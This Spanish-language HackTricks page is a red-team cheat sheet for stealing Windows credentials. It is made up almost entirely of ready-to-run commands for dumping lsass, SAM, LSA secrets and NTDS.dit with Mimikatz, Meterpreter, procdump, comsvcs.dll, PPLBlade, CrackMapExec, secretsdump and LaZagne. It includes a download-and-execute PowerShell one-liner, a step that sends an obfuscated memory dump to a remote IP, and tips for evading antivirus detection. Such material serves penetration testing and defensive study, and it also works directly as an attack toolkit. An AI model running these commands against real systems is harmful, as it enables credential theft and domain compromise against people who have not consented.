# Robo de Credenciales de Windows

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credenciales Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían prevenir que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Usa el [**Plugin de Credenciales**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evadiendo el Antivirus

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **es una herramienta legítima de Microsoft**, no es detectada por Defender.\
Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el volcado** y **extraer** las **credenciales localmente** del volcado.

{% code title="Volcar lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extraer credenciales del volcado" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
```markdown
{% endcode %}

Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, esto se debe a que están **detectando** la cadena **"procdump.exe" y "lsass.exe"**. Por lo tanto, es más **sigiloso** **pasar** como **argumento** el **PID** de lsass.exe a procdump **en lugar del** **nombre lsass.exe.**

### Volcando lsass con **comsvcs.dll**

Hay una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32` que **volca la memoria del proceso** siempre que estos **se cuelguen**. Esta DLL contiene una **función** llamada **`MiniDumpW`** que está escrita para ser llamada con `rundll32.exe`.\
Los dos primeros argumentos no se utilizan, pero el tercero se divide en 3 partes. La primera parte es el ID del proceso que se volcará, la segunda parte es la ubicación del archivo de volcado, y la tercera parte es la palabra **full**. No hay otra opción.\
Una vez que estos 3 argumentos se han analizado, básicamente esta DLL crea el archivo de volcado y vuelca el proceso especificado en ese archivo de volcado.\
Gracias a esta función, podemos usar **comsvcs.dll** para volcar el proceso lsass en lugar de subir procdump y ejecutarlo. (Esta información fue extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
### **Volcado de lsass con el Administrador de Tareas**

1. Haz clic derecho en la Barra de Tareas y haz clic en Administrador de Tareas
2. Haz clic en Más detalles
3. Busca el proceso "Proceso de Autoridad de Seguridad Local" en la pestaña de Procesos
4. Haz clic derecho en el proceso "Proceso de Autoridad de Seguridad Local" y haz clic en "Crear archivo de volcado".

### Volcado de lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte del conjunto de [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Volcado de lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta para volcar procesos protegidos que soporta la ofuscación de volcados de memoria y su transferencia a estaciones de trabajo remotas sin dejar rastro en el disco.

**Funcionalidades clave**:

1. Eludir la protección PPL
2. Ofuscar archivos de volcado de memoria para evadir mecanismos de detección basados en firmas de Defender
3. Subir volcado de memoria con métodos de carga RAW y SMB sin dejar rastro en el disco (volcado sin archivo)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Volcar hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Volcado de secretos LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el NTDS.dit del DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas NTDS.dit del DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet para cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Robo de SAM & SYSTEM

Estos archivos deben estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de manera regular** porque están protegidos.

### Desde el Registro

La forma más fácil de robar esos archivos es obtener una copia desde el registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos a tu máquina Kali y **extrae los hashes** utilizando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Copia de Sombra de Volumen

Puedes realizar copias de archivos protegidos utilizando este servicio. Necesitas ser Administrador.

#### Usando vssadmin

El binario vssadmin solo está disponible en versiones de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalmente, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

**El archivo Ntds.dit es una base de datos que almacena datos de Active Directory**, incluyendo información sobre objetos de usuario, grupos y membresía de grupos. Incluye los hashes de contraseñas para todos los usuarios en el dominio.

El importante archivo NTDS.dit se encontrará **ubicado en**: _%SystemRoom%/NTDS/ntds.dit_\
Este archivo es una base de datos _Extensible Storage Engine_ (ESE) y está "oficialmente" compuesto por 3 tablas:

* **Tabla de Datos**: Contiene la información sobre los objetos (usuarios, grupos...)
* **Tabla de Enlaces**: Información sobre las relaciones (miembro de...)
* **Tabla SD**: Contiene los descriptores de seguridad de cada objeto

Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** podría estar ubicada **dentro de la memoria de `lsass`** (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento al usar una **caché**).

#### Descifrando los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Descifrar la Clave de Encriptación de Contraseña (**PEK**) usando el **BOOTKEY** y **RC4**.
2. Descifrar el **hash** usando **PEK** y **RC4**.
3. Descifrar el **hash** usando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes utilizar el truco de [**copia de sombra de volumen**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (de nuevo, [**extráelo del registro o usa el truco de copia de sombra de volumen**](./#stealing-sam-and-system)).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlos automáticamente** utilizando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen los secretos, sino también los objetos completos y sus atributos para una extracción de información más detallada cuando el archivo NTDS.dit ya ha sido recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
```markdown
El `SYSTEM` hive es opcional pero permite la descifrado de secretos (hashes NT & LM, credenciales suplementarias como contraseñas en texto claro, llaves de kerberos o de confianza, historiales de contraseñas NT & LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y máquina con sus hashes, banderas de UAC, marca de tiempo para el último inicio de sesión y cambio de contraseña, descripción de cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y membresía, dominios de confianza con tipo de confianza, dirección y atributos...

## Lazagne

Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios programas.
```
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) y simplemente **ejecútalo** y las contraseñas serán extraídas.

## Defensas

[**Aprende sobre algunas protecciones de credenciales aquí.**](credentials-protections.md)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
